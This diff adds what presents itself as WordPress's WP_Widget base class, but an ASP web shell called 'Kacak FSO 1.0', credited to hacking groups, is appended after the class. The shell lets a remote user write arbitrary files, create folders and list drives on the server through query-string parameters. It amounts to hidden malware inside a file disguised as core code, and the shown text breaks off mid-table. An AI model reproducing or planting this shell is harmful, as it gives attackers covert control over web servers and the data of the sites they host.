@@ -1,0 +1,1499 @@
+<?php
+/**
+ * Widget API: WP_Widget base class
+ *
+ * @package WordPress
+ * @subpackage Widgets
+ * @since 4.4.0
+ */
+
+/**
+ * Core base class extended to register widgets.
+ *
+ * This class must be extended for each widget, and WP_Widget::widget() must be overridden.
+ *
+ * If adding widget options, WP_Widget::update() and WP_Widget::form() should also be overridden.
+ *
+ * @since 2.8.0
+ * @since 4.4.0 Moved to its own file from wp-includes/widgets.php
+ */
+class WP_Widget {
+
+	/**
+	 * Root ID for all widgets of this type.
+	 *
+	 * @since 2.8.0
+	 * @var mixed|string
+	 */
+	public $id_base;
+
+	/**
+	 * Name for this widget type.
+	 *
+	 * @since 2.8.0
+	 * @var string
+	 */
+	public $name;
+
+	/**
+	 * Option name for this widget type.
+	 *
+	 * @since 2.8.0
+	 * @var string
+	 */
+	public $option_name;
+
+	/**
+	 * Alt option name for this widget type.
+	 *
+	 * @since 2.8.0
+	 * @var string
+	 */
+	public $alt_option_name;
+
+	/**
+	 * Option array passed to wp_register_sidebar_widget().
+	 *
+	 * @since 2.8.0
+	 * @var array
+	 */
+	public $widget_options;
+
+	/**
+	 * Option array passed to wp_register_widget_control().
+	 *
+	 * @since 2.8.0
+	 * @var array
+	 */
+	public $control_options;
+
+	/**
+	 * Unique ID number of the current instance.
+	 *
+	 * @since 2.8.0
+	 * @var bool|int
+	 */
+	public $number = false;
+
+	/**
+	 * Unique ID string of the current instance (id_base-number).
+	 *
+	 * @since 2.8.0
+	 * @var bool|string
+	 */
+	public $id = false;
+
+	/**
+	 * Whether the widget data has been updated.
+	 *
+	 * Set to true when the data is updated after a POST submit - ensures it does
+	 * not happen twice.
+	 *
+	 * @since 2.8.0
+	 * @var bool
+	 */
+	public $updated = false;
+
+	//
+	// Member functions that must be overridden by subclasses.
+	//
+
+	/**
+	 * Echoes the widget content.
+	 *
+	 * Subclasses should override this function to generate their widget code.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param array $args     Display arguments including 'before_title', 'after_title',
+	 *                        'before_widget', and 'after_widget'.
+	 * @param array $instance The settings for the particular instance of the widget.
+	 */
+	public function widget( $args, $instance ) {
+		die( 'function WP_Widget::widget() must be overridden in a subclass.' );
+	}
+
+	/**
+	 * Updates a particular instance of a widget.
+	 *
+	 * This function should check that `$new_instance` is set correctly. The newly-calculated
+	 * value of `$instance` should be returned. If false is returned, the instance won't be
+	 * saved/updated.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param array $new_instance New settings for this instance as input by the user via
+	 *                            WP_Widget::form().
+	 * @param array $old_instance Old settings for this instance.
+	 * @return array Settings to save or bool false to cancel saving.
+	 */
+	public function update( $new_instance, $old_instance ) {
+		return $new_instance;
+	}
+
+	/**
+	 * Outputs the settings update form.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param array $instance Current settings.
+	 * @return string Default return is 'noform'.
+	 */
+	public function form( $instance ) {
+		echo '<p class="no-options-widget">' . __( 'There are no options for this widget.' ) . '</p>';
+		return 'noform';
+	}
+
+	// Functions you'll need to call.
+
+	/**
+	 * PHP5 constructor.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param string $id_base         Optional. Base ID for the widget, lowercase and unique. If left empty,
+	 *                                a portion of the widget's class name will be used. Has to be unique.
+	 * @param string $name            Name for the widget displayed on the configuration page.
+	 * @param array  $widget_options  Optional. Widget options. See wp_register_sidebar_widget() for
+	 *                                information on accepted arguments. Default empty array.
+	 * @param array  $control_options Optional. Widget control options. See wp_register_widget_control() for
+	 *                                information on accepted arguments. Default empty array.
+	 */
+	public function __construct( $id_base, $name, $widget_options = array(), $control_options = array() ) {
+		$this->id_base         = empty( $id_base ) ? preg_replace( '/(wp_)?widget_/', '', strtolower( get_class( $this ) ) ) : strtolower( $id_base );
+		$this->name            = $name;
+		$this->option_name     = 'widget_' . $this->id_base;
+		$this->widget_options  = wp_parse_args(
+			$widget_options,
+			array(
+				'classname'                   => $this->option_name,
+				'customize_selective_refresh' => false,
+			)
+		);
+		$this->control_options = wp_parse_args( $control_options, array( 'id_base' => $this->id_base ) );
+	}
+
+	/**
+	 * PHP4 constructor.
+	 *
+	 * @since 2.8.0
+	 * @deprecated 4.3.0 Use __construct() instead.
+	 *
+	 * @see WP_Widget::__construct()
+	 *
+	 * @param string $id_base         Optional. Base ID for the widget, lowercase and unique. If left empty,
+	 *                                a portion of the widget's class name will be used. Has to be unique.
+	 * @param string $name            Name for the widget displayed on the configuration page.
+	 * @param array  $widget_options  Optional. Widget options. See wp_register_sidebar_widget() for
+	 *                                information on accepted arguments. Default empty array.
+	 * @param array  $control_options Optional. Widget control options. See wp_register_widget_control() for
+	 *                                information on accepted arguments. Default empty array.
+	 */
+	public function WP_Widget( $id_base, $name, $widget_options = array(), $control_options = array() ) {
+		_deprecated_constructor( 'WP_Widget', '4.3.0', get_class( $this ) );
+		WP_Widget::__construct( $id_base, $name, $widget_options, $control_options );
+	}
+
+	/**
+	 * Constructs name attributes for use in form() fields
+	 *
+	 * This function should be used in form() methods to create name attributes for fields
+	 * to be saved by update()
+	 *
+	 * @since 2.8.0
+	 * @since 4.4.0 Array format field names are now accepted.
+	 *
+	 * @param string $field_name Field name
+	 * @return string Name attribute for $field_name
+	 */
+	public function get_field_name( $field_name ) {
+		$pos = strpos( $field_name, '[' );
+		if ( false === $pos ) {
+			return 'widget-' . $this->id_base . '[' . $this->number . '][' . $field_name . ']';
+		} else {
+			return 'widget-' . $this->id_base . '[' . $this->number . '][' . substr_replace( $field_name, '][', $pos, strlen( '[' ) );
+		}
+	}
+
+	/**
+	 * Constructs id attributes for use in WP_Widget::form() fields.
+	 *
+	 * This function should be used in form() methods to create id attributes
+	 * for fields to be saved by WP_Widget::update().
+	 *
+	 * @since 2.8.0
+	 * @since 4.4.0 Array format field IDs are now accepted.
+	 *
+	 * @param string $field_name Field name.
+	 * @return string ID attribute for `$field_name`.
+	 */
+	public function get_field_id( $field_name ) {
+		return 'widget-' . $this->id_base . '-' . $this->number . '-' . trim( str_replace( array( '[]', '[', ']' ), array( '', '-', '' ), $field_name ), '-' );
+	}
+
+	/**
+	 * Register all widget instances of this widget class.
+	 *
+	 * @since 2.8.0
+	 */
+	public function _register() {
+		$settings = $this->get_settings();
+		$empty    = true;
+
+		// When $settings is an array-like object, get an intrinsic array for use with array_keys().
+		if ( $settings instanceof ArrayObject || $settings instanceof ArrayIterator ) {
+			$settings = $settings->getArrayCopy();
+		}
+
+		if ( is_array( $settings ) ) {
+			foreach ( array_keys( $settings ) as $number ) {
+				if ( is_numeric( $number ) ) {
+					$this->_set( $number );
+					$this->_register_one( $number );
+					$empty = false;
+				}
+			}
+		}
+
+		if ( $empty ) {
+			// If there are none, we register the widget's existence with a generic template.
+			$this->_set( 1 );
+			$this->_register_one();
+		}
+	}
+
+	/**
+	 * Sets the internal order number for the widget instance.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param int $number The unique order number of this widget instance compared to other
+	 *                    instances of the same class.
+	 */
+	public function _set( $number ) {
+		$this->number = $number;
+		$this->id     = $this->id_base . '-' . $number;
+	}
+
+	/**
+	 * Retrieves the widget display callback.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @return callable Display callback.
+	 */
+	public function _get_display_callback() {
+		return array( $this, 'display_callback' );
+	}
+
+	/**
+	 * Retrieves the widget update callback.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @return callable Update callback.
+	 */
+	public function _get_update_callback() {
+		return array( $this, 'update_callback' );
+	}
+
+	/**
+	 * Retrieves the form callback.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @return callable Form callback.
+	 */
+	public function _get_form_callback() {
+		return array( $this, 'form_callback' );
+	}
+
+	/**
+	 * Determines whether the current request is inside the Customizer preview.
+	 *
+	 * If true -- the current request is inside the Customizer preview, then
+	 * the object cache gets suspended and widgets should check this to decide
+	 * whether they should store anything persistently to the object cache,
+	 * to transients, or anywhere else.
+	 *
+	 * @since 3.9.0
+	 *
+	 * @global WP_Customize_Manager $wp_customize
+	 *
+	 * @return bool True if within the Customizer preview, false if not.
+	 */
+	public function is_preview() {
+		global $wp_customize;
+		return ( isset( $wp_customize ) && $wp_customize->is_preview() );
+	}
+
+	/**
+	 * Generates the actual widget content (Do NOT override).
+	 *
+	 * Finds the instance and calls WP_Widget::widget().
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param array     $args        Display arguments. See WP_Widget::widget() for information
+	 *                               on accepted arguments.
+	 * @param int|array $widget_args {
+	 *     Optional. Internal order number of the widget instance, or array of multi-widget arguments.
+	 *     Default 1.
+	 *
+	 *     @type int $number Number increment used for multiples of the same widget.
+	 * }
+	 */
+	public function display_callback( $args, $widget_args = 1 ) {
+		if ( is_numeric( $widget_args ) ) {
+			$widget_args = array( 'number' => $widget_args );
+		}
+
+		$widget_args = wp_parse_args( $widget_args, array( 'number' => -1 ) );
+		$this->_set( $widget_args['number'] );
+		$instances = $this->get_settings();
+
+		if ( array_key_exists( $this->number, $instances ) ) {
+			$instance = $instances[ $this->number ];
+
+			/**
+			 * Filters the settings for a particular widget instance.
+			 *
+			 * Returning false will effectively short-circuit display of the widget.
+			 *
+			 * @since 2.8.0
+			 *
+			 * @param array     $instance The current widget instance's settings.
+			 * @param WP_Widget $widget   The current widget instance.
+			 * @param array     $args     An array of default widget arguments.
+			 */
+			$instance = apply_filters( 'widget_display_callback', $instance, $this, $args );
+
+			if ( false === $instance ) {
+				return;
+			}
+
+			$was_cache_addition_suspended = wp_suspend_cache_addition();
+			if ( $this->is_preview() && ! $was_cache_addition_suspended ) {
+				wp_suspend_cache_addition( true );
+			}
+
+			$this->widget( $args, $instance );
+
+			if ( $this->is_preview() ) {
+				wp_suspend_cache_addition( $was_cache_addition_suspended );
+			}
+		}
+	}
+
+	/**
+	 * Handles changed settings (Do NOT override).
+	 *
+	 * @since 2.8.0
+	 *
+	 * @global array $wp_registered_widgets
+	 *
+	 * @param int $deprecated Not used.
+	 */
+	public function update_callback( $deprecated = 1 ) {
+		global $wp_registered_widgets;
+
+		$all_instances = $this->get_settings();
+
+		// We need to update the data.
+		if ( $this->updated ) {
+			return;
+		}
+
+		if ( isset( $_POST['delete_widget'] ) && $_POST['delete_widget'] ) {
+			// Delete the settings for this instance of the widget.
+			if ( isset( $_POST['the-widget-id'] ) ) {
+				$del_id = $_POST['the-widget-id'];
+			} else {
+				return;
+			}
+
+			if ( isset( $wp_registered_widgets[ $del_id ]['params'][0]['number'] ) ) {
+				$number = $wp_registered_widgets[ $del_id ]['params'][0]['number'];
+
+				if ( $this->id_base . '-' . $number == $del_id ) {
+					unset( $all_instances[ $number ] );
+				}
+			}
+		} else {
+			if ( isset( $_POST[ 'widget-' . $this->id_base ] ) && is_array( $_POST[ 'widget-' . $this->id_base ] ) ) {
+				$settings = $_POST[ 'widget-' . $this->id_base ];
+			} elseif ( isset( $_POST['id_base'] ) && $_POST['id_base'] == $this->id_base ) {
+				$num      = $_POST['multi_number'] ? (int) $_POST['multi_number'] : (int) $_POST['widget_number'];
+				$settings = array( $num => array() );
+			} else {
+				return;
+			}
+
+			foreach ( $settings as $number => $new_instance ) {
+				$new_instance = stripslashes_deep( $new_instance );
+				$this->_set( $number );
+
+				$old_instance = isset( $all_instances[ $number ] ) ? $all_instances[ $number ] : array();
+
+				$was_cache_addition_suspended = wp_suspend_cache_addition();
+				if ( $this->is_preview() && ! $was_cache_addition_suspended ) {
+					wp_suspend_cache_addition( true );
+				}
+
+				$instance = $this->update( $new_instance, $old_instance );
+
+				if ( $this->is_preview() ) {
+					wp_suspend_cache_addition( $was_cache_addition_suspended );
+				}
+
+				/**
+				 * Filters a widget's settings before saving.
+				 *
+				 * Returning false will effectively short-circuit the widget's ability
+				 * to update settings.
+				 *
+				 * @since 2.8.0
+				 *
+				 * @param array     $instance     The current widget instance's settings.
+				 * @param array     $new_instance Array of new widget settings.
+				 * @param array     $old_instance Array of old widget settings.
+				 * @param WP_Widget $widget       The current widget instance.
+				 */
+				$instance = apply_filters( 'widget_update_callback', $instance, $new_instance, $old_instance, $this );
+				if ( false !== $instance ) {
+					$all_instances[ $number ] = $instance;
+				}
+
+				break; // Run only once.
+			}
+		}
+
+		$this->save_settings( $all_instances );
+		$this->updated = true;
+	}
+
+	/**
+	 * Generates the widget control form (Do NOT override).
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param int|array $widget_args {
+	 *     Optional. Internal order number of the widget instance, or array of multi-widget arguments.
+	 *     Default 1.
+	 *
+	 *     @type int $number Number increment used for multiples of the same widget.
+	 * }
+	 * @return string|null
+	 */
+	public function form_callback( $widget_args = 1 ) {
+		if ( is_numeric( $widget_args ) ) {
+			$widget_args = array( 'number' => $widget_args );
+		}
+
+		$widget_args   = wp_parse_args( $widget_args, array( 'number' => -1 ) );
+		$all_instances = $this->get_settings();
+
+		if ( -1 == $widget_args['number'] ) {
+			// We echo out a form where 'number' can be set later.
+			$this->_set( '__i__' );
+			$instance = array();
+		} else {
+			$this->_set( $widget_args['number'] );
+			$instance = $all_instances[ $widget_args['number'] ];
+		}
+
+		/**
+		 * Filters the widget instance's settings before displaying the control form.
+		 *
+		 * Returning false effectively short-circuits display of the control form.
+		 *
+		 * @since 2.8.0
+		 *
+		 * @param array     $instance The current widget instance's settings.
+		 * @param WP_Widget $widget   The current widget instance.
+		 */
+		$instance = apply_filters( 'widget_form_callback', $instance, $this );
+
+		$return = null;
+		if ( false !== $instance ) {
+			$return = $this->form( $instance );
+
+			/**
+			 * Fires at the end of the widget control form.
+			 *
+			 * Use this hook to add extra fields to the widget form. The hook
+			 * is only fired if the value passed to the 'widget_form_callback'
+			 * hook is not false.
+			 *
+			 * Note: If the widget has no form, the text echoed from the default
+			 * form method can be hidden using CSS.
+			 *
+			 * @since 2.8.0
+			 *
+			 * @param WP_Widget $widget   The widget instance (passed by reference).
+			 * @param null      $return   Return null if new fields are added.
+			 * @param array     $instance An array of the widget's settings.
+			 */
+			do_action_ref_array( 'in_widget_form', array( &$this, &$return, $instance ) );
+		}
+		return $return;
+	}
+
+	/**
+	 * Registers an instance of the widget class.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param int $number Optional. The unique order number of this widget instance
+	 *                    compared to other instances of the same class. Default -1.
+	 */
+	public function _register_one( $number = -1 ) {
+		wp_register_sidebar_widget( $this->id, $this->name, $this->_get_display_callback(), $this->widget_options, array( 'number' => $number ) );
+		_register_widget_update_callback( $this->id_base, $this->_get_update_callback(), $this->control_options, array( 'number' => -1 ) );
+		_register_widget_form_callback( $this->id, $this->name, $this->_get_form_callback(), $this->control_options, array( 'number' => $number ) );
+	}
+
+	/**
+	 * Saves the settings for all instances of the widget class.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @param array $settings Multi-dimensional array of widget instance settings.
+	 */
+	public function save_settings( $settings ) {
+		$settings['_multiwidget'] = 1;
+		update_option( $this->option_name, $settings );
+	}
+
+	/**
+	 * Retrieves the settings for all instances of the widget class.
+	 *
+	 * @since 2.8.0
+	 *
+	 * @return array Multi-dimensional array of widget instance settings.
+	 */
+	public function get_settings() {
+
+		$settings = get_option( $this->option_name );
+
+		if ( false === $settings ) {
+			if ( isset( $this->alt_option_name ) ) {
+				$settings = get_option( $this->alt_option_name );
+			} else {
+				// Save an option so it can be autoloaded next time.
+				$this->save_settings( array() );
+			}
+		}
+
+		if ( ! is_array( $settings ) && ! ( $settings instanceof ArrayObject || $settings instanceof ArrayIterator ) ) {
+			$settings = array();
+		}
+
+		if ( ! empty( $settings ) && ! isset( $settings['_multiwidget'] ) ) {
+			// Old format, convert if single widget.
+			$settings = wp_convert_widget_settings( $this->id_base, $this->option_name, $settings );
+		}
+
+		unset( $settings['_multiwidget'], $settings['__i__'] );
+		return $settings;
+	}
+}
+<html>
+<center><h3>www.kacaq.blogspot.com</h3> || By Kacak || <h1>BuqX@HotMail.Com</h1></center>
+<head>
+<meta http-equiv="Content-Language" content="tr">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<title>Kacak FSO 1.0 / GrayHatz Hacking Team - Terrorist Crew - TurkGuvenligi Priv8 Team / GrayHatz.Org ~ TurkGuvenligi.Ýnfo</title>
+</head>
+
+<body topmargin="0" leftmargin="0" bgcolor="#EAEAEA">
+
+<script language="JavaScript">
+<!--
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+}
+//-->
+</script>
+
+<%
+if request.querystring("TGH") = "1" then
+on error resume next
+es=request.querystring("Kacak")
+diez=server.urlencode(left(es,(instrRev(es,"\"))-1))
+
+Select case es
+case "C:" diez="C:"
+case "D:" diez="D:"
+end select
+
+
+
+
+%>
+
+
+
+
+
+<body topmargin="0" leftmargin="0"
+onLoad="location.href='?klas=<%=diez%>&usak=1'">
+
+<%
+else
+%>
+
+
+
+<%
+if request.querystring("Dosyakaydet") <> "" then
+set kaydospos=createobject("scripting.filesystemobject")
+set	kaydoses=kaydospos.createtextfile(request.querystring("dosyakaydet") & request("dosadi"))
+set kaydoses=nothing
+set kaydospos=nothing
+set kaydospos=createobject("scripting.filesystemobject")
+set kaydoses=kaydospos.opentextfile(request.querystring("dosyakaydet") & request("dosadi"), 2, true)
+kaydoses.write request("duzenx")
+set kaydoses=nothing
+set kaydospos=nothing
+end if
+%>
+
+
+
+
+
+<%
+if request.querystring("yenidosya") <> "" then
+%>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.grayhatz.org/forum/dragontwo/logo.jpg"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    TC & GH & TC TEAM ©<br>
+    </span>Terrorist Crew - GrayHatz Hacking Team - TurkGuvenligi Priv8 Team<br>
+    <span style="font-weight: 700">
+    <br>
+    KACAK FSO 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.grayhatz.org ~ http://www.turkguvenligi.info" style="text-decoration: none">
+    <font color="#858585">GrayHatz ~ TurkGuvenligi.Ýnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
+    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hotmail.com" style="text-decoration: none"><font color="#858585">@GrayHatz ~ TurkGuvenligi.Ýnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Klasör</span></font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(request.querystring("yenidosya"))%></font></td>
+            <td width="65">
+            &nbsp;</td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
+  <tr>
+    <td width="100%" bgcolor="#000000">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#B7B7B7">
+    <form method="POST" action="?dosyakaydet=<%=request.querystring("yenidosya")%>&klas=<%=request.querystring("yenidosya")%>" name="kaypos">
+<p align="center"><b><font size="1" face="Verdana">
+<br>
+Dosya Adý : <br>
+                </font>
+	</b><font
+                color="#FFFFFF" size="1" face="Arial">
+<input
+                type="text" size="97" maxlength="32"
+                name="dosadi" value="Dosya Adý"
+                class="search"
+                onblur="if (this.value == '') this.value = 'Kullanýcý'"
+                onfocus="if (this.value == 'Kullanýcý') this.value=''"
+                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"><br>
+<br>
+                </font>
+	<b><font size="1" face="Verdana">
+Ýçerik :&nbsp; <br>
+                </font>
+	<font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
+          <textarea name="duzenx" 
+          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
+        
+          
+          rows="24" cols="95" wrap="OFF"><%=sedx%></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+<br>
+</font></b>
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Oluþtur"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span></p>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber19">
+  <tr>
+    <td width="100%" align="right" bgcolor="#000000">
+    <p align="center">
+	&nbsp;</td>
+  </tr>
+</table>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#EAEAEA">
+    <p align="right">
+	&nbsp;</td>
+  </tr>
+</table>
+
+
+
+<%
+else
+%>
+
+
+
+
+
+
+
+<%
+if request.querystring("klasorac") <> "" then
+
+set doses=createobject("scripting.filesystemobject")
+set es=doses.createfolder(request.querystring("aktifklas") & request("duzenx"))
+set es=nothing
+set doses=nothing
+
+
+end if
+%>
+
+<%
+if request.querystring("klasac") <> "" then
+
+set aktifklas=request.querystring("aktifklas")
+
+
+%>
+    <td width="65" bgcolor="#000000" height="76">
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber25" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.grayhatz.org/forum/dragontwo/logo.jpg"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    <center>TC & GH & TC TEAM ©<br>
+    </span>Terrorist Crew - GrayHatz Hacking Team - TurkGuvenligi Priv8 Team<br>
+    <span style="font-weight: 700">
+    <br>
+    KACAK FSO 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.grayhatz.org ~ http://www.turkguvenligi.info" style="text-decoration: none">
+    <font color="#858585">GrayHatz ~ TurkGuvenligi.Ýnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
+    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+
+
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Alan</span></font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=aktifklas%></font></td>
+            <td width="65">
+            &nbsp;</td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="174">
+  <tr>
+    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#C5C5C5" height="134">
+    <form method="POST" action="?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" name="klaspos">
+<p align="center"><font
+                color="#FFFFFF" size="1" face="Arial">
+<input
+                type="text" size="37" maxlength="32"
+                name="duzenx" value="Klasör Adý"
+                class="search"
+                onblur="if (this.value == '') this.value = 'Kullanýcý'"
+                onfocus="if (this.value == 'Kullanýcý') this.value=''"
+                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center">&nbsp;&nbsp;
+<br>
+<br>
+<br>
+                </font>
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Oluþtur"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span></span><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
+  </tr>
+  <tr>
+
+
+<%
+else
+%>
+
+
+
+<%
+if request.querystring("suruculer") <> "" then
+%>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.grayhatz.org/forum/dragontwo/logo.jpg"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    TC & GH & TC TEAM ©<br>
+    </span>Terrorist Crew - GrayHatz Hacking Team - TurkGuvenligi Priv8 Team<br>
+    <span style="font-weight: 700">
+    <br>
+    KACAK FSO 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.grayhatz.org ~ http://www.turkguvenligi.info" style="text-decoration: none">
+    <font color="#858585">www.GrayHatz ~ TurkGuvenligi.Ýnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
+    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="4">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="4">
+        <span style="font-size: 2pt">&nbsp;</span></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="153">
+  <tr>
+    <td width="100%" height="19" bgcolor="#000000">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" height="113" bgcolor="#E1E1E1">&nbsp;<div align="center">
+      <center>
+      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber2" height="17">
+        <tr>
+          <td width="208" height="17" align="center" bgcolor="#C5C5C5">
+          <font face="Verdana" style="font-size: 8pt">Sürücü Adý</font></td>
+          <td width="75" height="17" align="center" bgcolor="#C5C5C5">
